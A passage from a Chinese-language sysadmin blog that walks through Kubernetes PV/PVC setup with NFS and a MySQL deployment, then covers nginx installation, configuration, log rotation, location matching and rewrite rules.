PV 的 capacity属性来设置的，目前只支持存储空间的设置，就是我们这里的 storage=1Gi，不过未来可能会加入 IOPS、吞吐量等指标的配置。 accessModes(访问模式) AccessModes 是用来对 PV 进行访问模式的设置，用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式： ReadWriteOnce（RWO）：读写权限，但是只能被单个节点挂载 ReadOnlyMany（ROX）：只读权限，可以被多个节点挂载 ReadWriteMany（RWX）：读写权限，可以被多个节点挂载 注意：一些 PV 可能支持多种访问模式，但是在挂载的时候只能使用一种访问模式，多种访问模式是不会生效的。 下图是一些常用的 Volume 插件支持的访问模式： persistentVolumeReclaimPolicy(回收策略) 我这里指定的 PV 的回收策略为 Recycle，目前 PV 支持的策略有三种： Retain（保留）- 保留数据，需要管理员手工清理数据 Recycle（回收）- 清除 PV 中的数据，效果相当于执行 rm -rf /thevoluem/* Delete（删除）- 与 PV 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务，比如 ASW EBS。 不过需要注意的是，目前只有 NFS 和 HostPath 两种类型支持回收策略。当然一般来说还是设置为 Retain 这种策略保险一点。 status（状态） 一个 PV 的生命周期中，可能会处于4中不同的阶段： Available（可用）：表示可用状态，还未被任何 PVC 绑定 Bound（已绑定）：表示 PV 已经被 PVC 绑定 Released（已释放）：PVC 被删除，但是资源还未被集群重新声明 Failed（失败）： 表示该 PV 的自动回收失败 五.k8s部署PVC的应用概念 PVC 的全称是：PersistentVolumeClaim（持久化卷声明），PVC 是用户存储的一种声明，PVC 和 Pod 比较类似，Pod 消耗的是节点，PVC 消耗的是 PV 资源，Pod 可以请求 CPU 和内存，而 PVC 可以请求特定的存储空间和访问模式。对于真正使用存储的用户不需要关心底层的存储实现细节，只需要直接使用 PVC 即可。 准备工作 在使用 PVC 之前，我们还得把其他节点上的 nfs 客户端给安装上，比如我们这里： 需要在所有节点安装 nfs 客户端程序，必须在所有节点都安装 nfs 客户端，否则可能会导致 PV 挂载不上的问题。安装命令如下： 1yum -y install nfs-utils rpcbind 新建 PVC同样的，我们来新建一个数据卷声明，来请求 1Gi 的存储容量，访问模式也是 ReadWriteOnce，YAML 文件如下：(pvc-nfs.yaml) 12345678910apiVersion: v1kind: PersistentVolumeClaimmetadata: name: pvc-nfsspec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi 可以看到这里的声明方法几乎和新建 PV 是一样的，在新建 PVC 之前，可以看下之前创建的 PV 的状态： 123kubectl get pvNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGEpv1 1Gi RWO Recycle Available 22m 可以看到当前 pv1 是在 Available 的一个状态，所以这个时候 PVC 可以和这个 PV 进行绑定： 12345$ kubectl create -f pvc-nfs.yamlpersistentvolumeclaim \"pvc-nfs\" created$ kubectl get pvcNAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGEpvc-nfs Bound pv1 1Gi RWO 10s 可以看到 pvc-nfs 创建成功了，状态是 Bound 状态了，这个时候再看下 PV 的状态呢： 123$ kubectl get pvNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGEpv1 1Gi RWO Recycle Bound default/pvc-nfs 24m 可以看到 PV 也是 Bound 状态了，对应的声明是 default/pvc-nfs，就是 default 命名空间下面的 pvc-nfs，证明刚刚新建的 pvc-nfs 和 pv-nfs 绑定成功了。 提问：并没有在 pvc-nfs 中指定关于 pv 的什么标志，它们之间是怎么就关联起来了的呢？ 解答：其实这是系统自动帮我们去匹配的，它会根据我们的声明要求去查找处于 Available 状态的 PV，如果没有找到的话那么PVC 就会一直处于 Pending 状态，找到了的话当然就会把当前的 PVC 和目标 PV 进行绑定，这个时候状态就会变成 Bound 状态了。 使用 PVC使用之前的 nginx 的镜像来测试下：(nfs-pvc-deploy.yaml) 12345678910111213141516171819202122232425262728293031323334353637383940414243apiVersion: apps/v1kind: Deploymentmetadata: name: nfs-pvcspec: selector: #新增这个字段 matchLabels: app: nfs-pvc replicas: 3 template: metadata: labels: app: nfs-pvc spec: containers: - name: nginx image: nginx:1.7.9 imagePullPolicy: IfNotPresent ports: - containerPort: 80 name: web volumeMounts: #挂载容器中的目录到pvc nfs中的目录 - name: www mountPath: /usr/share/nginx/html volumes: - name: www persistentVolumeClaim: #指定pvc claimName: pvc-nfs---apiVersion: v1kind: Servicemetadata: name: nfs-pvc labels: app: nfs-pvcspec: type: NodePort ports: - port: 80 targetPort: web #容器端口或名字 selector: app: nfs-pvc 这里使用 nginx 镜像，将容器的 /usr/share/nginx/html 目录通过 volume 挂载到名为 pvc-nfs 的 PVC 上面，然后创建一个 NodePort 类型的 Service 来暴露服务： 1234567891011121314$ kubectl create -f nfs-pvc-deploy.yamldeployment.extensions \"nfs-pvc\" createdservice \"nfs-pvc\" created$ kubectl get podsNAME READY STATUS RESTARTS AGEnfs-pvc-588c7b9b5d-h7r2s 1/1 Running 0 34snfs-pvc-588c7b9b5d-hss56 1/1 Running 0 34snfs-pvc-588c7b9b5d-k2t8z 1/1 Running 0 34s$ kubectl get svcAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 25hnfs-pvc NodePort 10.99.223.226 &lt;none&gt; 80:30061/TCP 75s 然后就可以通过任意节点的 IP:30061 端口来访问这里的 Nginx 服务了，但是这个时候访问会出现403，这是为什么？我们再去看看 nfs 共享数据目录下面有没有数据呢？ 1ls /data/k8s 发现并没有任何数据，这是因为我们把容器目录/user/share/nginx/html和挂载到了pvc-nfs这个 PVC 上面，这个 PVC 就是对应着我们上面的 nfs 的共享数据目录的，该目录下面还没有任何数据，所以我们访问就出现了403，现在我们在/data/k8s这个目录下面新建一个 index.html 的文件： 123 echo \"&lt;h1&gt;Hello Kubernetes~&lt;/h1&gt;\" &gt;&gt; /data/k8s/index.html ls /data/k8s/index.html 可以看到共享数据目录中已经有一个 index.html 的文件了，由于我们挂载了 pvc2-nfs 到上面的 nginx 容器中去，是不是这个时候容器目录**/user/share/nginx/html下面也有index.html**这个文件了啊？所以这个时候我们再来访问下服务，任一节点IP:30061 现在是不是正常了啊，但是我们可以看到我们容器中的数据是直接放到共享数据目录根目录下面的，如果以后有一个新的 nginx 容器也做了数据目录的挂载，会发生冲突，所以这个时候就不太好区分了，可以在 Pod 中使用一个新的属性：subPath，该属性可以来解决这个问题，只需要更改上面的 Pod 的 YAML 文件即可： 创建pvc子目录 1234volumeMounts:- name: www subPath: nginxpvc-test mountPath: /usr/share/nginx/html 更改完 YAML 文件后，我们重新更新即可： 12kubectl apply -f nfs-pvc-deploy.yaml 更新完后，我们再去看看 nfs 的数据共享目录： 这个时候是把nginxpvc-test这个目录映射到容器里的/usr/share/nginx/html/目录里了 123456 ls /data/k8s/index.html nginxpvc-testls /data/k8s/nginxpvc-test/echo \"&lt;h1&gt;Hello yichen~&lt;/h1&gt;\" &gt;&gt; /data/k8s/nginxpvc-test/index.html 这时候可以再去访问了。 查看在什么节点，然后可以进去容器看看 123kubectl get pods -o widedocker exec -it k8s_nginx_nfs-pvc-78d847877b-kxhh4_default_4266e /bin/bash 5.1.部署mysql持久化卷部署mysql持久化卷 1234567891011121314151617181920212223242526apiVersion: v1kind: PersistentVolumemetadata: name: mysql-pv-volume labels: type: localspec: storageClassName: manual capacity: storage: 5Gi accessModes: - ReadWriteOnce hostPath: path: &quot;/mnt/data&quot;---apiVersion: v1kind: PersistentVolumeClaimmetadata: name: mysql-pv-claimspec: storageClassName: manual accessModes: - ReadWriteOnce resources: requests: storage: 2Gi 部署MySQL服务 123456789101112131415161718192021222324252627282930313233343536373839404142apiVersion: v1kind: Servicemetadata: name: mysqlspec: ports: - port: 3306 selector: app: mysql clusterIP: None---apiVersion: apps/v1 # for versions before 1.9.0 use apps/v1beta2kind: Deploymentmetadata: name: mysqlspec: selector: matchLabels: app: mysql strategy: type: Recreate template: metadata: labels: app: mysql spec: containers: - image: mysql:5.7 name: mysql env: - name: MYSQL_ROOT_PASSWORD value: password # 改成自己实际的密码 ports: - containerPort: 3306 name: mysql volumeMounts: - name: mysql-persistent-storage mountPath: /var/lib/mysql volumes: - name: mysql-persistent-storage persistentVolumeClaim: claimName: mysql-pv-claim 创建 1kubectl create -f mysql.yaml 查看deployment mysql 资源详细信息 1kubectl describe deployment mysql 确认下服务是否按装完毕 1kubectl get pods -l app=mysql 查看mysql-pv-claim 资源详细信息 1kubectl describe pvc mysql-pv-claim 通过虚拟机宿主机登陆mysql镜像 1kubectl run -it --rm --image=mysql:5.6 --restart=Never mysql-client -- mysql -h mysql -pLukeVip123","link":"/2020/08/04/k8s%E6%90%AD%E5%BB%BA/"},{"title":"nginx基础","text":"一.nginx基础1.nginx安装nginx的官网安装文档 1http://nginx.org/en/linux_packages.html#RHEL-CentOS 0.yum安装 12345678yum install -y epel-release //安装扩展源yum install -y nginx查看nginx安装过程执行了哪些操作。rpm -q --scripts nginx-filesystem 查看nginx生成了哪些文件 rpm -ql nginx 除了上面之外，还可以自定义源，这样的话安装nginx的版本比上面更新 1.搭建yum仓库安装 安装相关yum工具 1sudo yum install -y yum-utils 配置yum源 1234567891011121314151617vim /etc/yum.repos.d/nginx.repo[nginx-stable]name=nginx stable repobaseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=1enabled=1gpgkey=https://nginx.org/keys/nginx_signing.keymodule_hotfixes=true[nginx-mainline]name=nginx mainline repobaseurl=http://nginx.org/packages/mainline/centos/$releasever/$basearch/gpgcheck=1enabled=0gpgkey=https://nginx.org/keys/nginx_signing.keymodule_hotfixes=true //如果有epel源则先要禁用，否则冲突 1234如果这个变量识别不了的话是缺少软件包，$releasever下载就可以了yum install centos-release 清除yum缓存和重新加载 123yum clean allyum makecache fast 默认情况下，使用稳定的nginx软件包的存储库。如果要使用主线nginx软件包，请运行以下命令： 1sudo yum-config-manager --enable nginx-mainline 开始安装 1sudo yum install nginx 2.源码安装 编译安装nginx来定制自己的模块,首先安装缺少的依赖包： 1yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel 下载源码包 1234cd /usr/local/src/wget http://nginx.org/download/nginx-1.18.0.tar.gz解压tar zxf nginx-1.18.0.tar.gz 为了后续准备我们另外下载2个插件模块：nginx_upstream_check_module-0.3.0.tar.gz —— 检查后端服务器的状态，nginx-goodies-nginx-sticky-module-ng-bd312d586752.tar.gz（建议在/usr/local/src下解压后将目录重命名为nginx-sticky-module-ng-1.2.6） —— 后端做负载均衡解决session sticky问题（与upstream_check模块结合使用需要另外打补丁）。 请注意插件与nginx的版本兼容问题，一般插件越新越好，nginx不用追新，稳定第一。nginx-1.4.7，nginx-sticky-module-1.1，nginx_upstream_check_module-0.2.0，这个搭配也没问题。sticky-1.1与nginx-1.6版本由于更新没跟上编译出错。（可以直接使用Tengine，默认就包括了这些模块） 123456789下载nginx-upstream_check_module模块wget https://github.com/yaoweibin/nginx_upstream_check_module/archive/v0.3.0.tar.gztar xzf v0.3.0.tar.gz下载nginx-goodies-nginx-sticky模块wget https://bitbucket.org/nginx-goodies/nginx-sticky-module-ng/get/1.2.6.tar.gztar zxf 1.2.6.tar.gzmv nginx-goodies-nginx-sticky-module-ng-c78b7dd79d0d nginx-sticky-module-ng-1.2.6 开始初始化 12345678910cd nginx-1.18.0/./configure --prefix=/usr/local/nginx //如果有报错，yum安装pcre-devel和zlib-devel上面这种是最简单的编译安装其他的创建运行用户、组useradd -M -s /sbin/nologin nginx./configure --prefix=/usr/local/nginx-1.8 --user=nginx --group=nginx --with-pcre --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module --add-module=../nginx_upstream_check_module-0.3.0 初始化完成会出现下面的结果 开始安装 1make &amp;&amp; make install 安装成功/usr/local/就会有nginx目录 2.2 常用编译选项说明 nginx大部分常用模块，编译时./configure --help以--without开头的都默认安装。 --prefix=PATH ： 指定nginx的安装目录。默认 /usr/local/nginx --conf-path=PATH ： 设置nginx.conf配置文件的路径。nginx允许使用不同的配置文件启动，通过命令行中的-c选项。默认为prefix/conf/nginx.conf --user=name： 设置nginx工作进程的用户。安装完成后，可以随时在nginx.conf配置文件更改user指令。默认的用户名是nobody。--group=name类似 --with-pcre ： 设置PCRE库的源码路径，如果已通过yum方式安装，使用--with-pcre自动找到库文件。使用--with-pcre=PATH时，需要从PCRE网站下载pcre库的源码（版本4.4 – 8.30）并解压，剩下的就交给Nginx的./configure和make来完成。perl正则表达式使用在location指令和 ngx_http_rewrite_module模块中。 --with-zlib=PATH ： 指定 zlib（版本1.1.3 – 1.2.5）的源码解压目录。在默认就启用的网络传输压缩模块ngx_http_gzip_module时需要使用zlib 。 --with-http_ssl_module ： 使用https协议模块。默认情况下，该模块没有被构建。前提是openssl与openssl-devel已安装 --with-http_stub_status_module ： 用来监控 Nginx 的当前状态 --with-http_realip_module ： 通过这个模块允许我们改变客户端请求头中客户端IP地址值(例如X-Real-IP 或 X-Forwarded-For)，意义在于能够使得后台服务器记录原始客户端的IP地址 --add-module=PATH ： 添加第三方外部模块，如nginx-sticky-module-ng或缓存模块。每次添加新的模块都要重新编译（Tengine可以在新加入module时无需重新编译） 为主程序设置环境变量 123456789vim /etc/profile在末尾添加export PATH=$PATH:/usr/local/nginx-1.8/sbin/保存退出source /etc/profile或者直接添加软连接也可以ln -s /usr/local/nginx-1.8/sbin/nginx /usr/local/sbin/nginx nginx启动相关命令 1234567891011121314151617181920212223242526nginx -h 查看所有命令帮助检测配置文件是否正确nginx -t 查看编译的选项或版本nginx -V 启动关闭或重新加载nginx nginx -s stop nginx -s reload-s signal —向 主进程发送信号。参数信号可以是以下之一：stop —快速关闭quit —正常关闭reload —重新加载配置，使用新配置启动新工作进程，并正常关闭旧工作进程。reopen —重新打开日志文件把这个日子文件重新分隔 /usr/local/nginx/logs/access.logmv access.log access.log.bak再新建access.log touch access.log 这时候需要执行下reopen命令nginx -s reopen 查看nginx是否启动 1ps -aux |grep nginx 通过信号量控制nginx 12345678910111213141516171819官方文档http://nginx.org/en/docs/control.htmlnginx可以通过信号进行控制。/usr/local/nginx/logs/nginx.pid默认情况下，主进程的进程ID被写入文件 。可以在配置时或nginx.conf使用 pid 伪指令更改此名称 。主进程支持以下信号：TERM, INT 快速关机QUIT 正常关关机，优雅的关闭进程，等待请求结束后再关闭HUP 更改配置，使用新配置启动新工作进程，正常关闭旧工作进程，和reload一样USR1 重新打开日志文件，在日志按月/日分隔时有用USR2 升级可执行文件 平滑的升级WINCH 优雅关闭旧工作进程(配合USR2来进行升级)示例:kill -INT 19569 快速关闭nginx主进程kill -QUIT 25914 优雅的关闭kill -HUP 26172 重新加载配置文件，同nginx -s reload一样可以不用每次都查看进程号，kill -HUP $(cat /usr/local/nginx-1.8/logs/nginx.pid) 源码安装配置system服务 编写启动脚本 12345678910111213141516171819202122232425262728vim /usr/lib/systemd/system/nginx.service[Unit]Description=nginxAfter=network.target remote-fs.target nss-lookup.target[Service]Type=forkingPIDFile=/usr/local/nginx-1.8/logs/nginx.pidExecStartPost=/bin/sleep 0.1ExecStartPre=/usr/local/nginx-1.8/sbin/nginx -t -c /usr/local/nginx-1.8/conf/nginx.confExecStart=/usr/local/nginx-1.8/sbin/nginx -c /usr/local/nginx-1.8/conf/nginx.confExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target 加载下系统 1systemctl daemon-reload 这时候就可以通过下面几种方式启动了 12345678910启动停止，重启systemctl start nginxsystemctl stop nginxsystemctl restart nginx重新加载systemctl reload nginx开机自启动和diablesystemctl enable nginxsystemctl disable nginx 这里需要注意的是配置了system服务后。通过systemctl start nginx启动的服务。然后通过nginx -s stop也是可以关闭nginx的，但是通过直接通过nginx 启动的，就不能通过systemctl stop nginx 来关闭， 同时再通过systemctl start nginx来启动nginx也会报错。因为nginx已经在启动了 2.nginx配置官方文档地址 1http://nginx.org/en/docs/ 1.nginx.conf配置文件Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。 main部分设置的指令将影响其它所有部分的设置； server部分的指令主要用于指定虚拟主机域名、IP和端口； upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡； location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。 他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。 当前nginx支持的几个指令上下文 通用模板 下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116user nginx nginx;worker_processes 2; #这里可以指定auto; 自动 error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info; pid logs/nginx.pid; events {use epoll;worker_connections 2048;} http {include mime.types;default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; '# '$status $body_bytes_sent &quot;$http_referer&quot; '# '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; #access_log logs/access.log main; sendfile on;# tcp_nopush on; keepalive_timeout 65; # gzip压缩功能设置gzip on;gzip_min_length 1k;gzip_buffers 32 4k;gzip_http_version 1.1;gzip_comp_level 6;gzip_types text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml;gzip_vary on; # http_proxy 设置client_max_body_size 10m;client_body_buffer_size 128k;proxy_connect_timeout 75;proxy_send_timeout 75;proxy_read_timeout 75;proxy_buffer_size 4k;proxy_buffers 4 32k;proxy_busy_buffers_size 64k;proxy_temp_file_write_size 64k;proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # 设定负载均衡后台服务器列表upstream backend {#ip_hash;server 192.168.224.11:8080 max_fails=2 fail_timeout=30s ;server 192.168.224.12:8080 max_fails=2 fail_timeout=30s ;} # 很重要的虚拟主机配置server {listen 80;server_name itoatest.example.com;root /apps/oaapp; charset utf-8;access_log logs/host.access.log main; #对 / 所有做负载均衡+反向代理location / {root /apps/oaapp;index index.jsp index.html index.htm; proxy_pass http://backend;proxy_redirect off;# 后端的Web服务器可以通过X-Forwarded-For获取用户真实IPproxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; } #静态文件，nginx自己处理，不去backend请求tomcatlocation ~* /download/ {root /apps/oa/fs; }location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)${root /apps/oaapp;expires 7d;}location /nginx_status {stub_status on;access_log off;allow 192.168.224.0/24;deny all;} location ~ ^/(WEB-INF)/ {deny all;}#error_page 404 /404.html; # redirect server error pages to the static page /50x.html#error_page 500 502 503 504 /50x.html;location = /50x.html {root html;}}include /software/站点配置文件/*.conf; ## 其它虚拟主机，server 指令开始} 2.配置nginx的正常访问主要修改server段 正常80端口 123456789server { listen 80; server_name server1.com; location / { root /software/server1; index index.html index.htm; }} 本机的域名绑定可以通过windos下修改hosts文件。 1234win+ R键 输入下面的命令，去etc找hosts文件去修改内容。C:\\Windows\\System32\\drivers\\etc\\如果权限不足，可以鼠标右击点击属性，点击安全，进行权限编辑。 3.nginx日志管理1.日志格式，是指记录哪些选项 默认的日志格式: main 1234567891011log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log logs/access.log main;ip地址 - 远程用户 - 用户时间 请求方式(如GET/POST) status状态 请求体body长度(如果状态是304的话,长度一般是0 ) referer来源信息,也就是当前网页的url地址。 http_user_agent 用户代理/蜘蛛， 被转发的请求的原始ip.http_x_forwarded_for: 在经过代理时，代理把你的本来ip加在此头信息中。传输你的原始ip 蜘蛛 123456789101112131415这里可以看到各种蜘蛛名，有百度、谷歌、搜狗等等。www.baidu.com/robots.txtUser-agent: GooglebotDisallow: /baiduDisallow: /s?Disallow: /shifen/Disallow: /homepage/Disallow: /cproDisallow: /ulink?Disallow: /link?Disallow: /home/news/data/Disallow: /bh上面表示google蜘蛛爬虫 不能爬的目录有哪些。，有些是竞价用的。 自定义格式1 123456789log_format main '[\\$time_local] \\$http_host &quot;\\$request&quot; \\$remote_addr \\$remote_user ' '\\$status \\$body_bytes_sent &quot;\\$http_referer&quot; &quot;\\$http_user_agent&quot; ' '&quot;\\$http_x_forwarded_for&quot; \\$request_time \\$upstream_response_time ' '&quot;\\$upstream_addr&quot; \\$upstream_status';request_time: 请求的用的时间 upstream_reponse_time 响应时间$upstream_addr 后端服务的地址upstream_statu后端响应的状态 nginx允许针对不同的server做不同的Log(有的web服务器不支持) 修改下配置文件 123456789101112server { listen 80; server_name yichen1.com; location / { root /software/yichen1; index index.html index.htm; } access_log /usr/local/nginx-1.8/logs/yichen1.com.access.log main;} 然后重新加载 123systemctl reload nginx这时候就会发现对应的目录下生成的yichen1的日志。也是main格式的。 2.nginx定时任务完成日志切割 用shell脚本实现 12345678910111213141516171819vim runlog.sh#!/bin/bashLOGPATH=/usr/local/nginx-1.8/logs/access.logBASEPATH=/usr/local/nginx-1.8/logsbak=$BASEPATH/$(date -d yesterday +%Y%m%d).assess.log #昨天的时间#bak=$BASEPATH/$(date -d yesterday +%Y%m%d%H%M).access.logecho $bakmv $LOGPATH $bak#压缩日志tar -czf ${bak}.gz $bak 2&amp;&gt; /dev/null touch $LOGPATHkill -USR1 $(cat /usr/local/nginx-1.8/logs/nginx.pid)rm -rf $bak #删除原有日志没有压缩的 然后做定时任务 12345678cronte -e 00 0 * * * sh /software/runlog.sh #每天执行#每个月的1号，11号，21号，31号执行0 0 */10 * * sh /software/runlog.sh#每个月执行0 0 1 * * sh /software/runlog.sh 3.其他方式日志轮转 参考网址 1https://ethendev.github.io/2019/01/10/roate-nginx-log/ 12345678910111213141516 # 日志轮转 cat &lt;&lt;EOF &gt;/etc/logrotate.d/nginx/etc/nginx/logs/*log { daily rotate 10 missingok notifempty compress sharedscripts dateext postrotate [ ! -f /usr/local/openresty/nginx/logs/nginx.pid ] || /bin/kill -USR1 `cat /usr/local/openresty/nginx/logs/nginx.pid 2&gt;/dev/null` 2&gt;/dev/null || true endscript}EOF 调试脚本，测试脚本是否正确 1sudo /usr/sbin/logrotate -d -f /etc/logrotate.d/nginx 手动运行\b运行脚本分割日志 1sudo /usr/sbin/logrotate -f /etc/logrotate.d/nginx 添加定时任务 通过下面的命令添加定时任务(注意需要指定运行 nginx 的用户，不然可能没有权限无法正确执行) 1234sudo crontab -u root -e # rotate nginx log erery day0 0 * * * /usr/sbin/logrotate -f /etc/logrotate.d/nginx #每天执行 如果要删除上面的\b定时任务，运行如下命令 1crontab -r 如果任务没有正确执行，可以通过如下命令查看任务日志 1vim /var/log/cron 4.location的正则匹配location: 用来设定不同的uri的文件系统的路径映射，一个server中可以设置多个location,nginx会根据用户请求的uri地址来逐个判断location,找出最佳匹配规则，然后应用该location中定义的配置。location是nginx使用频率非常非常高的指令，匹配规则以及匹配优先级是location指令比较复杂的地方, 网址的解释 123456789http://yichen1.com/index.html?channelCode=22&amp;&amp;b=2url 表示整个网址uri 表示域名后面的字符串 /index.html?channelCode=22&amp;&amp;b=2host 表示域名 yichen1.com而location是匹配uri的。配置文件里面可以通过变量提取https://$host$request_uri;$host表示yichen1.com $request_uri表示 /index.html?channelCode=22&amp;&amp;b=2 基本语法 1234语法: location [ = | ~ | ~* | ^~ ] uri {...}location @name {...}默认: —可以使用的块: server, location 其中: =:对uri做精确匹配，优先级最高，如果匹配成功，则停止向下搜索，并立即处理此请求。比如: 123location = / {... ...} 当请求https://www.baidu.com/时匹配，但当访问https://www.baidu.com/index.html则不匹配； ^~: 对uri起始字符做字符串匹配(注意: 不是正则匹配), 区分大小写，会检索所有匹配，以匹配长度为优先，一旦匹配上，不再进行正则匹配; ~: 对uri(可以不是起始字符)做正则表达式匹配，区分大小写； ~*: 对uri(可以不是起始字符)做正则表达式匹配，不区分大小写； 不带符号: 匹配起始于此字符串的所有uri,区分大小写。 注意: 字符串匹配(无论是 ^~ 还是 无符号 匹配)，后面都必须以/ 开头，否则将永远匹配不上。正则匹配可以。 它们匹配度优先级为： = &gt; ^&gt; &gt; ~ = ~* &gt; 不带符号 下面可以测试 12345678910111213141516171819202122232425262728293031323334server { listen 80 ; listen 443 ssl; server_name yichen2.com; root /usr/share/nginx/html; index test.html ; ssl_certificate /root/ssl/yichen2.crt; ssl_certificate_key /root/ssl/yichen2.key; location = / { return 701;} location ^~ /img { return 702;} location ~ /img { return 703;} location ~* /img { return 704;} location /imgs { return 705;} location / { return 666;}} 通过curl 来方式测试下优先级 1234curl -k -I yichen2.com 返回701 curl -k -I yichen2.com/img 返回702curl -k -I yichen2.com/imgs 返回703 #因为正则比无符号优先级高curl -k -I yichen2.com/ssdjdj 返回666 正则匹配和普通匹配 123456789101112131415server { listen 80; server_name yichen1.com; location / { root /software/yichen1; index index.html index.htm; } #access_log /usr/local/nginx-1.8/logs/yichen1.com.access.log main; location ~ image { root /software/; index index.html;}} index 的内容 1&lt;img src=&quot;./image/6dong.gif&quot; /&gt; 创建一个放image的目录。让放入图片 1mkdir /software/image 此时访问yichen1.com 会出现图片。但是路径是访问的/software/image/6dong.gif的图片。而不是默认的/software/yichen1/image/的图片。 总结: location的命中过程是这样的。 1.先判断精准命中，如果命中。立刻返回结果并结束解析过程 2.判断普通命中，如果有多个命中，记录下来最长的命中结果。(注意: 记录但不结束，最长的为准) 3.继续判断正则表达式解析的结果，按配置里的正则表达式顺序为准，由上到下开始匹配，一旦匹配成功1个，立即返回结果，并结束解析过程。 延时分析：a. 普通命中 顺序无所谓，是因为按命中的长短来确定的。 ​ b. 正则命中，顺序有所谓，因为是从前往后命中的。 5.rewrite语法详解官方文档 1http://nginx.org/en/docs/http/ngx_http_rewrite_module.html 重写中常用的指令 break #跳出 rewrite if (条件) {} 设定条件再进行重写 return #返回状态码，也可以在返回新的url地址 rewrite #重写 set #设置变量 指令1: break 1234567Syntax: break;Default: —Context: server, location, if语法: break;默认: -可以使用的块: server, location, if, 如果在location中指定了伪指令，则 在此位置继续进行请求的进一步处理。 列 1234if ($slow) { limit_rate 10k; break;} 指令2: if 123语法: if (condition) { ... }默认: —可以使用的块: server, location 指定的condition(条件表达式)被评估。如果为true，则执行大括号内指定的此模块指令，并在指令内为请求分配配置 if。if指令中的配置是从先前的配置级别继承的。 条件可以是以下任意一种： 变量名；如果变量的值为空字符串或“ 0 ”，则为false；否则为false 。 在1.0.1版之前，任何以“ 0” 开头的字符串都被视为错误值。 使用“ =”和“ !=”运算符将变量与字符串进行比较； 使用“ ~”（用于区分大小写的匹配）和“ ~*”（用于不区分大小写的匹配）运算符将变量与正则表达式进行匹配。正则表达式可以包含捕获，这些捕获可用于以后在$1.. $9变量中重用。负运算符“ !~”和“ !~*”也可用。如果正则表达式包含“ }”或“ ;”字符，则整个表达式应用单引号或双引号引起来。 使用“ -f”和“ !-f”运算符检查文件是否存在； 使用“ -d”和“ !-d”运算符检查目录是否存在； 使用“ -e”和“ !-e”运算符检查文件，目录或符号链接是否存在； 使用“ -x”和“ !-x”运算符检查可执行文件。 例子： 可以引用的变量 12 cat conf/fastcgi.conf可以去这里看。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748if ($http_user_agent ~ MSIE) { rewrite ^(.*)$ /msie/$1 break;} #如果客户端浏览器是IE浏览器 则重写到/msie/$1 目录下的内容。break 退出if ($http_cookie ~* &quot;id=([^;]+)(?:;|$)&quot;) { set $id $1;}if ($request_method = POST) { return 405;} #如果请求模式是post 就返回405if ($slow) { limit_rate 10k;}if ($invalid_referer) { return 403;}下面的是：如果访问ip是224.1的就返回403,不让访问下面的家目录。location / { if ($remote_addr = 192.168.224.1) { return 403;} root /software/yichen1; index index.html index.htm; }如果是ie浏览器访问的键跳转其他页面。 location / { if ($http_user_agent ~ Trident) { rewrite ^(.*)$ /ie.html break;} root /software/yichen1/; index index.html index.htm; }判断路径文件不存在就返回404.html页面。 location / { if ( !-e $document_root$fastcgi_script_name) { rewrite ^(.*)$ /404.html break;} root /software/yichen1/; index index.html index.htm; } 指令3: return 12345678语法： return code [text]; return code URL; return URL;默认： -可以使用的块： server，location，if另外，URL可以将带有代码302 的用于临时重定向的a 指定为唯一参数。这样的参数应以“ http://”，“ https://”或“ $scheme”字符串开头。一个URL可以包含变量。 指令4: rewrite 12345语法： rewrite 正则表达式 replacement [flag];默认： -可以使用的块： server，location，ifreplacement: 替换的新内容 如果指定的正则表达式与请求URI匹配，则URI将按照replacement字符串中的指定进行更改。该rewrite指令在其在配置文件中出现的顺序执行。可以使用标志终止指令的进一步处理。如果替换字符串以“ http://”，“ https://”或“ $scheme” 开头，则处理将停止并将重定向返回给客户端。 可选*flag*参数可以是以下之一： last 停止处理当前ngx_http_rewrite_module指令集， 并开始搜索与更改后的URI相匹配的新位置； break ngx_http_rewrite_module与break指令一样， 停止处理当前的指令集 ； redirect 返回带有302代码的临时重定向；如果替换字符串不是以“ http://”，“ https://”或“ $scheme” 开头，则使用 permanent 返回带有301代码的永久重定向。 完整的重定向URL是根据请求方案（$scheme）以及 server_name_in_redirect和 port_in_redirect指令形成的。 break 和permanent的区别 123456789101112 location ~ { rewrite goods-(\\d+).html /test.html break;}#访问http://yichen.com/goods-122.html 会显示/test.html的内容，但是网页上还是显示当前的url http://yichen.com/goods-122.html; location ~ { 